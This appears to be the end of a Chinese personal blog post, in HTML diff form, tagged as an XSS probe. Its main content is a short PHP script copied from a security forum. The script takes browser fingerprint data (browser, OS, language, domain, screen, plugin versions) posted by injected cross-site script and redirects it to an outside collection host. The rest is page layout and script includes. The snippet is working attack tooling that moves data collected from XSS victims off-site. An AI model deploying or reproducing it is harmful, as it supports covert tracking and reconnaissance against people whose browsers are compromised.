+<div class="blockcode" style="word-wrap:break-word;line-height:normal;margin:10px 0px;padding:10px 0px 5px 10px;width:586px;border:1px solid #cccccc;background-image:url(https://forum.90sec.org/images/default/codebg.gif);background-color:#f7f7f7;overflow:hidden;background-position:0px 0px;background-repeat:no-repeat repeat;"><div id="code1" style="word-wrap:break-word;"><br><br>1.  &lt;?phpif (!empty($_GET[“c”])){&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;$data = quotes($_GET[“c”]);&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;$ar_data = json_decode(urldecode($data), true);&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;header(“Location:<a href="http://xssprobe.sinaapp.com/index.php?do=api&amp;id={$_GET[id]}&amp;browser_name={$ar_data[browser][name]}&amp;browser_version={$ar_data[browser][version]}&amp;language={$ar_data[lang]}&amp;domain={$ar_data[domain]}&amp;screen={$ar_data[screen]}&amp;flash_version={$ar_data[flash]}&amp;Osystem={$ar_data[system]}&amp;java_version={$ar_data[java][0]}&quot;);}function" target="_blank" rel="noopener">http://xssprobe.sinaapp.com/index.php?do=api&amp;id={$_GET[id]}&amp;browser_name={$ar_data[browser][name]}&amp;browser_version={$ar_data[browser][version]}&amp;language={$ar_data[lang]}&amp;domain={$ar_data[domain]}&amp;screen={$ar_data[screen]}&amp;flash_version={$ar_data[flash]}&amp;Osystem={$ar_data[system]}&amp;java_version={$ar_data[java][0]}&quot;);}function</a> quotes($content){&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;if(get_magic_quotes_gpc()){&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; if(is_array($content)){&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;foreach($content as $key=&gt;$value){&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;$content[$key] = stripslashes($value);&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;}&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; }else{&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$content = stripslashes($content);}&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;}else{}&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;return $content;}<br><br>2.  ?&gt;<br></div><br><span style="word-wrap:break-word;margin-left:43px;font-size:12px;cursor:pointer;color:#666666;">复制代码</span></div><br></td><br></tr><br></tbody><br></table><br></div><br><div id="post_rate_div_77510" style="word-wrap:break-word;line-height:normal;color:#444444;font-family:Verdana, Helvetica, Arial, sans-serif;"></div><br><div class="points" style="word-wrap:break-word;width:1337.484375px;margin:10px auto;text-align:center;overflow:hidden;clear:both;line-height:normal;color:#444444;font-family:Verdana, Helvetica, Arial, sans-serif;"></div>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/xss探针/" rel="tag"># xss探针</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2013/07/22/杂事/" rel="next" title="杂事">
+                <i class="fa fa-chevron-left"></i> 杂事
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2013/09/07/写在2013-9-7/" rel="prev" title="写在2013/9/7">
+                写在2013/9/7 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">John Doe</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">165</span>
+                  <span class="site-state-item-name">Artikel</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-name">Kategorien</span>
+                
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">183</span>
+                  <span class="site-state-item-name">Tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Erstellt mit  <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
